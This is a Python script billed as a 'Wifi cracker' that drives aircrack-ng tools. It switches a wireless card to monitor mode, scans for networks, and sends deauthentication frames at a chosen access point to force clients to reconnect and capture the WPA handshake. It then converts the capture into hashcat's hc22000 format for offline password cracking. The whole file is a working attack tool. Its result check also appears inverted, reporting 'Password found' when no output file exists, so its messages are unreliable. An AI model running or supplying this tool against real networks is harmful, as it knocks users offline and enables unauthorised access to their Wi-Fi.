import subprocess as sub
import glob
import time
from colorama import Fore
import pyfiglet
import re


def set_monitor_mode(interface):
    process = sub.run(["iwconfig"], stdout=sub.PIPE)
    print(process.stdout.decode())
    result= process.stdout.decode()

    if "Mon" in result:
        print(Fore.GREEN + "\ninterface already in monitor mode")
        time.sleep(1)
        return interface
    else:
        sub.call(["airmon-ng","start",interface],stdout= sub.PIPE)
        process2 = sub.run(["iwconfig"], stdout=sub.PIPE)
        process = sub.run(["ifconfig"], stdout=sub.PIPE)
        result2 = process2.stdout.decode()
        result = process.stdout.decode()
        pattern = r'^(\w+):'
        final = re.findall(pattern, result, re.MULTILINE)
        if "Mon" in result2:
            print(Fore.GREEN + "\nInterface switched to monitor mode")
            time.sleep(1)
            for i in final:
                if "mon" in i:
                    a=1
                    break
                else:
                    a=0
            if a==1:
                return interface + "mon"
            else:
                return interface
        else:
            print(Fore.RED + "\nFailed to switch to interface monitor mode")

def scan_wifi(mon_interface):
    print(Fore.YELLOW + "\nCtrl+c for stop scan")
    time.sleep(2)
    proces = sub.Popen(["airodump-ng", mon_interface])
    try:
        proces.wait()
    except:
        print(Fore.GREEN + "\nScan ended")



def scan_target(bssid, channel, mon_interface, name,zaman):

    airodump_process = sub.Popen(["xterm", "-geometry", "100x60+100+100", "-e", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", name, mon_interface])

    aireplay_process = sub.Popen(["xterm","-geometry", "100x60+800+100", "-e", "aireplay-ng", "--deauth", "15", "-a", bssid, mon_interface])
    aireplay_process.wait()

    try:
        airodump_process.wait(timeout=zaman)
    except sub.TimeoutExpired:
        airodump_process.kill()


def convert(name):
    filenames = glob.glob(name + "*.cap")

    if filenames:
        for filename in filenames:
            with open("/dev/null", "w") as devnull:
                sub.Popen(["hcxpcapngtool", filename, "-o", f"{name}.hc22000"], stdout=devnull, stderr=devnull)
    else:
        print(Fore.RED + "\nNo matching files found.")

    file1 = glob.glob(name+"*.csv")
    file2 = glob.glob(name+"*.netxml")
    delete_files = file1 + file2
    for filename in delete_files:
        sub.Popen(["rm", filename])




def checking(name):
    if glob.glob(name + ".hc22000"):
        print(Fore.RED + "\nPassword not found")
    else:
        print(Fore.GREEN + "\nPassword found ---->> " + name + ".hc22000" )




def managed_mode(mon_interface):
    managed = sub.Popen(["airmon-ng", "stop", mon_interface])
    managed.wait()
    print(Fore.GREEN + "\nSwitched to interface managed mode")
    print(pyfiglet.figlet_format("END"))


#START
print(pyfiglet.figlet_format("W i f i \n c r a c k e r"))


result = sub.run(["iwconfig"],stdout=sub.PIPE)
print(result.stdout.decode())
interface = input(Fore.GREEN + "\nEnter the interface name (wlan0) : ")

mon_interface = set_monitor_mode(interface)
scan_wifi(mon_interface)


bssid = input(Fore.GREEN + "\nEnter the target BSSID: ")
channel = input(Fore.GREEN + "\nEnter the target channel: ")
while True:
    try:
        zaman = int(input(Fore.GREEN + "\nEnter time for capture handshake (best is 20-30): "))
        break
    except:
        print(Fore.RED + "\nPlease enter the number")

name= input(Fore.GREEN + "\nEnter file name : ")


scan_target(bssid, channel, mon_interface, name, zaman)

convert(name)
print(Fore.GREEN + "\nProcess ended")

checking(name)

if input(Fore.YELLOW + "\nSwitch to interface managed mode? ( yes-y || No-n ): ") == "y":
    managed_mode(mon_interface)

